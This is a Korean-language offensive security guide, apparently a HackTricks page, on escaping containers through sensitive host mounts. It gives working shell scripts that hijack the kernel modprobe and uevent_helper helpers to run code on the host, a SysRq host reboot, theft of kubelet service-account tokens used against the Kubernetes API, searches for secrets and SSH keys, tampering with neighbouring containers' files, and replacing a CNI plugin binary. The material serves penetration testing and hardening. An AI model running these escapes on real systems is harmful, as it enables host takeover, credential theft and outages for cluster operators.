# 민감한 Host Mount

{{#include ../../../banners/hacktricks-training.md}}

## 개요

Host mount는 신중하게 격리된 process view를 host 리소스에 대한 직접적인 visibility로 되돌리는 경우가 많기 때문에, 가장 중요한 실질적인 container-escape attack surface 중 하나입니다. 위험한 경우는 `/`에만 국한되지 않습니다. `/proc`, `/sys`, `/var`, runtime socket, kubelet이 관리하는 state 또는 device 관련 path의 bind mount는 kernel control, credential, 인접한 container filesystem 및 runtime management interface를 노출할 수 있습니다.

이 페이지는 abuse model이 여러 영역에 걸쳐 있기 때문에 개별 protection 페이지와 별도로 존재합니다. Writable host mount가 위험한 이유는 mount namespace, user namespace, AppArmor 또는 SELinux coverage, 그리고 정확히 어떤 host path가 노출되었는지와 부분적으로 관련됩니다. 이를 별도의 topic으로 다루면 attack surface를 훨씬 쉽게 분석할 수 있습니다.

## `/proc` 노출

procfs에는 일반적인 process information과 high-impact kernel control interface가 모두 포함되어 있습니다. 따라서 `-v /proc:/host/proc`와 같은 bind mount 또는 예상하지 못한 writable proc entry를 노출하는 container view는 information disclosure, denial of service 또는 직접적인 host code execution으로 이어질 수 있습니다.

High-value procfs path는 다음과 같습니다:

- `/proc/sys/kernel/core_pattern`
- `/proc/sys/kernel/modprobe`
- `/proc/sys/vm/panic_on_oom`
- `/proc/sys/fs/binfmt_misc`
- `/proc/config.gz`
- `/proc/sysrq-trigger`
- `/proc/kmsg`
- `/proc/kallsyms`
- `/proc/[pid]/mem`
- `/proc/kcore`
- `/proc/kmem`
- `/proc/mem`
- `/proc/sched_debug`
- `/proc/[pid]/mountinfo`

### Abuse

먼저 어떤 high-value procfs entry가 보이거나 writable인지 확인합니다:
```bash
for p in \
/proc/sys/kernel/core_pattern \
/proc/sys/kernel/modprobe \
/proc/sysrq-trigger \
/proc/kmsg \
/proc/kallsyms \
/proc/kcore \
/proc/sched_debug \
/proc/1/mountinfo \
/proc/config.gz; do
[ -e "$p" ] && ls -l "$p"
done
```
이 경로들은 서로 다른 이유로 중요합니다. `core_pattern`, `modprobe`, `binfmt_misc`는 쓰기 가능한 경우 호스트에서 code execution 경로가 될 수 있습니다. `kallsyms`, `kmsg`, `kcore`, `config.gz`는 kernel exploitation을 위한 강력한 reconnaissance 소스입니다. `sched_debug`와 `mountinfo`는 컨테이너 내부에서 호스트 레이아웃을 재구성하는 데 도움이 되는 process, cgroup, filesystem context를 노출합니다.

각 경로의 실질적인 가치는 서로 다르며, 모두 동일한 영향력을 가진 것처럼 취급하면 triage가 더 어려워집니다:

- `/proc/sys/kernel/core_pattern`
쓰기 가능한 경우 가장 영향력이 큰 procfs 경로 중 하나입니다. kernel은 crash 이후 pipe handler를 실행하기 때문입니다. 컨테이너가 `core_pattern`을 overlay에 저장된 payload 또는 mount된 호스트 경로를 가리키도록 설정할 수 있다면, 호스트 code execution을 획득할 수 있는 경우가 많습니다. 전용 예시는 [read-only-paths.md](protections/read-only-paths.md)도 참조하세요.
- `/proc/sys/kernel/modprobe`
이 경로는 kernel이 module-loading logic을 호출해야 할 때 사용하는 userspace helper를 제어합니다. 컨테이너에서 쓰기 가능하고 호스트 context에서 해석된다면, 또 다른 호스트 code-execution primitive가 될 수 있습니다. 특히 helper 경로를 trigger할 방법과 결합될 때 주목할 만합니다.
- `/proc/sys/vm/panic_on_oom`
일반적으로 깔끔한 escape primitive는 아니지만, OOM condition을 kernel panic 동작으로 변환하여 memory pressure를 호스트 전체의 denial of service로 만들 수 있습니다.
- `/proc/sys/fs/binfmt_misc`
registration interface가 쓰기 가능한 경우, attacker는 선택한 magic value에 대한 handler를 등록하고 일치하는 파일이 실행될 때 host-context execution을 얻을 수 있습니다.
- `/proc/config.gz`
kernel exploit triage에 유용합니다. 호스트 package metadata 없이도 어떤 subsystem, mitigation, optional kernel feature가 활성화되어 있는지 확인하는 데 도움이 됩니다.
- `/proc/sysrq-trigger`
주로 denial-of-service 경로이지만 매우 심각한 경로입니다. 호스트를 즉시 reboot하거나 panic 상태로 만들거나, 그 밖의 방식으로 중단시킬 수 있습니다.
- `/proc/kmsg`
kernel ring buffer message를 노출합니다. host fingerprinting, crash analysis, 그리고 일부 환경에서는 kernel exploitation에 도움이 되는 정보의 leak에 유용합니다.
- `/proc/kallsyms`
읽을 수 있다면 유용합니다. exported kernel symbol 정보를 노출하므로 kernel exploit 개발 중 address randomization 가정을 무력화하는 데 도움이 될 수 있습니다.
- `/proc/[pid]/mem`
직접적인 process-memory interface입니다. 대상 process에 필요한 ptrace-style condition으로 접근할 수 있다면 다른 process의 memory를 읽거나 수정할 수 있습니다. 실제 영향은 credentials, `hidepid`, Yama, ptrace restriction에 크게 좌우되므로 강력하지만 조건부인 경로입니다.
- `/proc/kcore`
system memory를 core-image와 유사한 형태로 보여줍니다. 파일이 매우 크고 사용하기 까다롭지만, 의미 있게 읽을 수 있다면 호스트 memory surface가 심각하게 노출되어 있음을 의미합니다.
- `/proc/kmem` 및 `/proc/mem`
역사적으로 영향력이 큰 raw memory interface입니다. 많은 최신 시스템에서는 비활성화되거나 강하게 제한되지만, 존재하고 사용할 수 있다면 critical finding으로 취급해야 합니다.
- `/proc/sched_debug`
scheduling 및 task 정보를 leak하며, 다른 process view가 예상보다 깔끔해 보이는 경우에도 호스트 process identity를 노출할 수 있습니다.
- `/proc/[pid]/mountinfo`
컨테이너가 호스트의 실제 어디에 위치하는지, 어떤 경로가 overlay-backed인지, 그리고 쓰기 가능한 mount가 호스트 content에 해당하는지 아니면 컨테이너 layer에만 해당하는지를 재구성하는 데 매우 유용합니다.

`/proc/[pid]/mountinfo` 또는 overlay 세부 정보를 읽을 수 있다면 이를 사용하여 컨테이너 filesystem의 호스트 경로를 복구하세요:
```bash
cat /proc/self/mountinfo | head -n 50
mount | grep overlay
```
이 명령어들은 여러 host-execution tricks에서 container 내부의 경로를 host 관점의 해당 경로로 변환해야 하기 때문에 유용합니다.

### 전체 예시: `modprobe` Helper Path Abuse

`/proc/sys/kernel/modprobe`가 container에서 writable하고 helper path가 host context에서 해석되는 경우, attacker-controlled payload로 redirect할 수 있습니다:
```bash
[ -w /proc/sys/kernel/modprobe ] || exit 1
host_path=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
cat <<'EOF' > /tmp/modprobe-payload
#!/bin/sh
id > /tmp/modprobe.out
EOF
chmod +x /tmp/modprobe-payload
echo "$host_path/tmp/modprobe-payload" > /proc/sys/kernel/modprobe
cat /proc/sys/kernel/modprobe
```
정확한 trigger는 target과 kernel 동작에 따라 달라지지만, 중요한 점은 writable helper path가 향후 kernel helper invocation을 attacker-controlled host-path content로 redirect할 수 있다는 것입니다.

### `kallsyms`, `kmsg`, `config.gz`를 활용한 전체 Kernel Recon 예시

목표가 즉각적인 escape가 아니라 exploitability assessment인 경우:
```bash
head -n 20 /proc/kallsyms 2>/dev/null
dmesg 2>/dev/null | head -n 50
zcat /proc/config.gz 2>/dev/null | egrep 'IKCONFIG|BPF|USER_NS|SECCOMP|KPROBES' | head -n 50
```
이 명령어들은 유용한 symbol 정보가 노출되는지, 최근 kernel 메시지에서 흥미로운 상태가 드러나는지, 그리고 어떤 kernel 기능 또는 mitigation이 컴파일되어 포함되었는지 확인하는 데 도움이 됩니다. 일반적으로 영향은 직접적인 escape가 아니지만, kernel vulnerability triage에 필요한 시간을 크게 줄일 수 있습니다.

### Full Example: SysRq Host Reboot

`/proc/sysrq-trigger`가 writable이고 host view에 도달한다면:
```bash
echo b > /proc/sysrq-trigger
```
효과는 즉시 호스트 재부팅으로 나타납니다. 미묘한 예시는 아니지만, procfs 노출이 단순한 정보 disclosure보다 훨씬 심각할 수 있음을 명확히 보여 줍니다.

## `/sys` Exposure

sysfs는 대량의 kernel 및 device 상태를 노출합니다. 일부 sysfs 경로는 주로 fingerprinting에 유용하지만, 다른 경로는 helper 실행, device 동작, security-module 구성 또는 firmware 상태에 영향을 줄 수 있습니다.

주요 sysfs 경로는 다음과 같습니다.

- `/sys/kernel/uevent_helper`
- `/sys/class/thermal`
- `/sys/kernel/vmcoreinfo`
- `/sys/kernel/security`
- `/sys/firmware/efi/vars`
- `/sys/firmware/efi/efivars`
- `/sys/kernel/debug`

이러한 경로가 중요한 이유는 각각 다릅니다. `/sys/class/thermal`은 thermal-management 동작에 영향을 줄 수 있으므로, 노출이 심각하게 발생한 환경에서는 호스트 안정성에 영향을 줄 수 있습니다. `/sys/kernel/vmcoreinfo`는 crash-dump 및 kernel-layout 정보를 leak하여 low-level host fingerprinting을 돕습니다. `/sys/kernel/security`는 Linux Security Modules가 사용하는 `securityfs` 인터페이스이므로, 이 경로에 대한 예상치 못한 access는 MAC 관련 상태를 노출하거나 변경할 수 있습니다. EFI variable 경로는 firmware가 관리하는 boot 설정에 영향을 줄 수 있으므로, 일반적인 configuration file보다 훨씬 심각한 문제가 될 수 있습니다. `/sys/kernel/debug` 아래의 `debugfs`는 특히 위험합니다. 이 인터페이스는 의도적으로 developer 중심으로 설계되었으며, hardened production-facing kernel API보다 safety에 대한 기대 수준이 훨씬 낮기 때문입니다.

이러한 경로를 검토할 때 유용한 commands는 다음과 같습니다.
```bash
find /sys/kernel/security -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/kernel/debug -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/firmware/efi -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/class/thermal -maxdepth 3 -type f 2>/dev/null | head -n 50
cat /sys/kernel/vmcoreinfo 2>/dev/null | head -n 20
```
이러한 항목이 흥미로운 이유:

- `/sys/kernel/security`는 AppArmor, SELinux 또는 다른 LSM surface가 원래 host 전용으로 남아 있어야 할 방식으로 노출되어 있는지 보여줄 수 있습니다.
- `/sys/kernel/debug`는 이 그룹에서 가장 우려되는 항목인 경우가 많습니다. `debugfs`가 mount되어 있고 읽기 또는 쓰기가 가능하다면, 광범위한 kernel-facing surface가 존재한다고 볼 수 있으며, 정확한 위험도는 활성화된 debug node에 따라 달라집니다.
- EFI variable 노출은 흔하지 않지만, 일반적인 runtime file이 아니라 firmware-backed setting에 접근하므로 impact가 큽니다.
- `/sys/class/thermal`은 깔끔한 shell-style escape보다는 주로 host 안정성과 hardware interaction 측면에서 중요합니다.
- `/sys/kernel/vmcoreinfo`는 주로 host fingerprinting 및 crash analysis의 source이며, low-level kernel state를 파악하는 데 유용합니다.

### Full Example: `uevent_helper`

`/sys/kernel/uevent_helper`가 writable이면, `uevent`가 trigger될 때 kernel이 attacker-controlled helper를 실행할 수 있습니다:
```bash
cat <<'EOF' > /evil-helper
#!/bin/sh
id > /output
EOF
chmod +x /evil-helper
host_path=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
echo "$host_path/evil-helper" > /sys/kernel/uevent_helper
echo change > /sys/class/mem/null/uevent
cat /output
```
이 방식이 작동하는 이유는 helper path가 host의 관점에서 해석되기 때문입니다. 트리거되면 helper는 현재 container 내부가 아니라 host context에서 실행됩니다.

## `/var` 노출

host의 `/var`를 container에 mount하는 것은 `/`를 mount하는 것만큼 극적으로 보이지 않기 때문에 과소평가되는 경우가 많습니다. 하지만 실제로는 runtime sockets, container snapshot directories, kubelet이 관리하는 pod volumes, projected service-account tokens, 그리고 인접한 application filesystems에 접근하기에 충분할 수 있습니다. 최신 node에서는 실제로 가장 운영상 중요한 container state가 `/var`에 존재하는 경우가 많습니다.

### Kubernetes Example

`hostPath: /var`를 사용하는 pod는 다른 pod의 projected tokens와 overlay snapshot content를 읽을 수 있는 경우가 많습니다:
```bash
find /host-var/ -type f -iname '*.env*' 2>/dev/null
find /host-var/ -type f -iname '*token*' 2>/dev/null | grep kubernetes.io
cat /host-var/lib/kubelet/pods/<pod-id>/volumes/kubernetes.io~projected/<volume>/token 2>/dev/null
```
이 명령어들은 해당 mount가 단순한 애플리케이션 데이터만 노출하는지, 아니면 영향력이 큰 cluster 자격 증명까지 노출하는지 판단하는 데 유용합니다. 읽을 수 있는 service-account token이 있으면 로컬 code execution이 즉시 Kubernetes API access로 이어질 수 있습니다.

token이 존재한다면 token discovery에서 멈추지 말고, 해당 token으로 접근할 수 있는 대상을 검증하세요:
```bash
TOKEN=$(cat /host-var/lib/kubelet/pods/<pod-id>/volumes/kubernetes.io~projected/<volume>/token 2>/dev/null)
curl -sk -H "Authorization: Bearer $TOKEN" https://kubernetes.default.svc/api
```
여기서 영향은 로컬 node access보다 훨씬 클 수 있습니다. 광범위한 RBAC 권한이 있는 token은 마운트된 `/var`를 통해 cluster-wide compromise로 이어질 수 있습니다.

### Docker 및 containerd 예시

Docker hosts에서는 관련 데이터가 주로 `/var/lib/docker` 아래에 있으며, containerd 기반 Kubernetes nodes에서는 `/var/lib/containerd` 또는 snapshotter별 경로 아래에 있을 수 있습니다:
```bash
docker info 2>/dev/null | grep -i 'docker root\\|storage driver'
find /host-var/lib -maxdepth 5 -type f -iname '*.env*' 2>/dev/null | head -n 50
find /host-var/lib -maxdepth 8 -type f -iname 'index.html' 2>/dev/null | head -n 50
```
마운트된 `/var`가 다른 workload의 쓰기 가능한 snapshot 콘텐츠를 노출하는 경우, attacker는 현재 container 설정을 건드리지 않고도 application 파일을 변경하거나, web 콘텐츠를 심거나, startup 스크립트를 수정할 수 있습니다.

쓰기 가능한 snapshot 콘텐츠가 발견된 후의 구체적인 악용 아이디어:
```bash
echo '<html><body>pwned</body></html>' > /host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/<id>/fs/usr/share/nginx/html/index2.html 2>/dev/null
grep -Rni 'JWT_SECRET\\|TOKEN\\|PASSWORD' /host-var/lib 2>/dev/null | head -n 50
find /host-var/lib -type f -path '*/.ssh/*' -o -path '*/authorized_keys' 2>/dev/null | head -n 20
```
이 명령들은 mount된 `/var`가 미치는 세 가지 주요 영향 범주인 애플리케이션 변조, secret 복구, 인접 workload로의 lateral movement를 보여 주므로 유용합니다.

## Kubelet State, Plugins, And CNI 경로

`/var/lib/kubelet`, `/opt/cni/bin` 또는 `/etc/cni/net.d`의 mount는 privileged DaemonSets, CNI agents, CSI node plugins, GPU operators 및 storage helpers를 통해 노출되는 경우가 많습니다. 이러한 mount는 "node plumbing"으로 쉽게 간과되지만, 새 pod의 실행 경로에 직접 위치하며 kubelet credentials, projected secrets, registration sockets 및 실행 가능한 host-side plugin binaries를 포함하는 경우가 많습니다.

주요 고가치 대상은 다음과 같습니다.

- `/var/lib/kubelet/pki`
- `/var/lib/kubelet/pods`
- `/var/lib/kubelet/device-plugins/kubelet.sock`
- `/var/lib/kubelet/pod-resources/kubelet.sock`
- `/var/lib/kubelet/plugins`
- `/var/lib/kubelet/plugins_registry`
- `/opt/cni/bin`
- `/etc/cni/net.d`

유용한 검토 명령은 다음과 같습니다:
```bash
find /host-var/lib/kubelet -maxdepth 3 \( -type f -o -type s \) 2>/dev/null | \
egrep 'pki|pods/.*/token|device-plugins|pod-resources|plugins(_registry)?' | head -n 100
ls -ld /host/opt/cni/bin /host/etc/cni/net.d 2>/dev/null
find /host/opt/cni/bin -maxdepth 1 -type f -perm /111 2>/dev/null
grep -RniE 'type|ipam|delegate' /host/etc/cni/net.d 2>/dev/null | head -n 50
```
이러한 경로가 중요한 이유:

- `/var/lib/kubelet/pki`에는 kubelet client certificates 및 기타 노드 로컬 credentials가 노출될 수 있으며, cluster 설계에 따라 API server 또는 kubelet-facing TLS endpoints에 재사용될 수 있습니다.
- `/var/lib/kubelet/pods`에는 동일한 노드의 인접한 pods에 대한 projected service-account tokens 및 mounted Secrets가 포함되는 경우가 많습니다.
- `/var/lib/kubelet/pod-resources/kubelet.sock`은 주로 reconnaissance surface이지만 매우 유용합니다. 현재 어떤 pods와 containers가 GPUs, hugepages, SR-IOV devices 및 기타 부족한 노드 로컬 resources를 사용 중인지 보여줍니다.
- `/var/lib/kubelet/device-plugins`, `/var/lib/kubelet/plugins`, `/var/lib/kubelet/plugins_registry`는 설치된 CSI, DRA 및 device plugins와 kubelet이 통신해야 하는 sockets를 보여줍니다. 해당 directories가 단순히 읽을 수 있는 수준이 아니라 writable하다면 finding은 훨씬 더 심각해집니다.
- `/opt/cni/bin` 및 `/etc/cni/net.d`는 pod-network setup path에 직접 위치합니다. 이곳에 대한 writable access는 단순한 configuration exposure가 아니라 지연된 host-execution primitive가 되는 경우가 많습니다.

### Full Example: Writable `/opt/cni/bin`

호스트 CNI binary directory가 read-write로 mount되어 있다면, plugin을 교체하는 것만으로도 다음에 kubelet이 해당 노드에서 pod sandbox를 생성할 때 host execution을 얻기에 충분할 수 있습니다:
```bash
plugin=$(find /host/opt/cni/bin -maxdepth 1 -type f -perm /111 | \
grep -E '/(bridge|loopback|portmap|calico|flannel|cilium-cni)$' | head -n1)
[ -n "$plugin" ] || exit 1
mv "$plugin" "${plugin}.orig"
cat <<'EOF' > "$plugin"
#!/bin/sh
id > /tmp/cni-triggered
exec "$(dirname "$0")/$(basename "$0").orig" "$@"
EOF
chmod +x "$plugin"
echo "wait for the next pod scheduled on this node"
```
이는 마운트된 `docker.sock`만큼 즉각적인 위험은 아니지만, 침해된 Kubernetes 인프라 pod에서는 더 현실적인 경우가 많습니다. 중요한 점은 수정된 binary가 현재 컨테이너가 아니라, 이후 호스트 네트워크 설정 흐름에 의해 실행된다는 것입니다.


## Runtime Sockets

민감한 호스트 마운트에는 전체 디렉터리가 아니라 Runtime Socket이 포함되는 경우가 많습니다. 이는 매우 중요하므로 여기서 다시 명시적으로 강조할 가치가 있습니다:
```text
/run/containerd/containerd.sock
/var/run/crio/crio.sock
/run/podman/podman.sock
/run/buildkit/buildkitd.sock
/var/run/kubelet.sock
/run/firecracker-containerd.sock
```
이러한 소켓 중 하나가 mount된 후의 전체 exploitation 흐름은 [runtime-api-and-daemon-exposure.md](runtime-api-and-daemon-exposure.md)를 참조하세요.

빠른 첫 interaction pattern은 다음과 같습니다:
```bash
docker -H unix:///host/run/docker.sock version 2>/dev/null
ctr --address /host/run/containerd/containerd.sock images ls 2>/dev/null
crictl --runtime-endpoint unix:///host/var/run/crio/crio.sock ps 2>/dev/null
```
이 중 하나라도 성공하면, "mounted socket"에서 "더 높은 권한의 sibling container 시작"으로 이어지는 경로는 일반적으로 어떤 kernel breakout 경로보다 훨씬 짧습니다.

## Writable Host Path Task Hijack

writable host mount는 위험하기 위해 `/`를 노출할 필요가 없습니다. mount된 경로에 scripts, config files, hooks, plugins 또는 이후 host-side scheduled task나 service에서 사용하는 files가 포함되어 있다면, container가 host에서 실행하는 대상을 변경할 수 있습니다.

일반적인 검토 흐름:
```bash
mount | grep -E ' /host|/mnt|/shared|/opt|/var '
find /host /mnt /shared -maxdepth 4 -type f -writable 2>/dev/null | head -n 50
grep -RniE 'cron|systemd|ExecStart|sh |bash |python|backup|hook|plugin' /host /mnt /shared 2>/dev/null | head -n 50
```
쓰기 가능한 파일을 호스트 프로세스가 사용하는 경우, 테스트 중에는 payload를 단순하고 관찰 가능하게 유지하세요:
```bash
printf '#!/bin/sh\nid >/tmp/host-task-check\n' > /host/path/to/hook.sh
chmod +x /host/path/to/hook.sh
```
흥미로운 부분은 trust boundary입니다. write는 container 내부에서 발생하지만, execution은 이후 host service context에서 발생합니다. 이로 인해 좁은 범위의 hostPath 또는 bind mount가 지연된 host-code-execution primitive로 전환됩니다.

## Mount 관련 CVE

Host mount는 runtime 취약점과도 연관됩니다. 최근의 중요한 예시는 다음과 같습니다.

- `runc`의 `CVE-2024-21626`: 유출된 directory file descriptor를 통해 working directory가 host filesystem에 위치할 수 있었습니다.
- BuildKit의 `CVE-2024-23651`, `CVE-2024-23652`, `CVE-2024-23653`: 악성 Dockerfile, frontend 및 `RUN --mount` flow를 통해 build 중 host file access, deletion 또는 elevated privileges가 다시 가능해질 수 있었습니다.
- Buildah 및 Podman build flow의 `CVE-2024-1753`: crafted bind mount를 사용한 build 중 `/`를 read-write로 노출할 수 있었습니다.
- `containerd` 2.1.0의 `CVE-2025-47290`: image unpack 중 발생하는 TOCTOU로 인해 specially crafted image가 pull 과정에서 host filesystem을 수정할 수 있었습니다.

이러한 CVE가 여기서 중요한 이유는 mount handling이 operator configuration에만 국한되지 않음을 보여주기 때문입니다. runtime 자체도 mount-driven escape condition을 발생시킬 수 있습니다.

## Checks

다음 command를 사용하면 높은 가치의 mount exposure를 신속하게 찾을 수 있습니다:
```bash
mount
find / -maxdepth 3 \( -path '/host*' -o -path '/mnt*' -o -path '/rootfs*' \) -type d 2>/dev/null | head -n 100
find / -maxdepth 4 \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
find /host-var/lib/kubelet -maxdepth 3 \( -type f -o -type s \) 2>/dev/null | egrep 'pki|token|device-plugins|pod-resources|plugins(_registry)?' | head -n 100
ls -ld /host/opt/cni/bin /host/etc/cni/net.d 2>/dev/null
find /proc/sys -maxdepth 3 -writable 2>/dev/null | head -n 50
find /sys -maxdepth 4 -writable 2>/dev/null | head -n 50
```
여기서 흥미로운 점:

- Host root, `/proc`, `/sys`, `/var`, runtime sockets는 모두 높은 우선순위의 findings입니다.
- 쓰기 가능한 proc/sys 항목은 해당 mount가 안전한 container view가 아니라 host 전역 kernel controls를 노출하고 있음을 의미하는 경우가 많습니다.
- Mount된 `/var` 경로는 단순한 filesystem 검토뿐 아니라 credential 및 인접 workload 검토도 필요합니다.
- Kubelet state directories와 CNI/plugin 경로는 runtime sockets와 동일한 우선순위로 검토해야 합니다. 이러한 경로는 node의 pod-creation 및 credential-distribution 경로에 직접 위치하는 경우가 많기 때문입니다.

## References

- [Kubelet이 사용하는 Local Files And Paths](https://kubernetes.io/docs/reference/node/kubelet-files/)
- [`hostPath` mount를 통해 host에 액세스할 수 있는 cilium-agent container](https://github.com/cilium/cilium/security/advisories/GHSA-4hc4-pgfx-3mrx)
{{#include ../../../banners/hacktricks-training.md}}
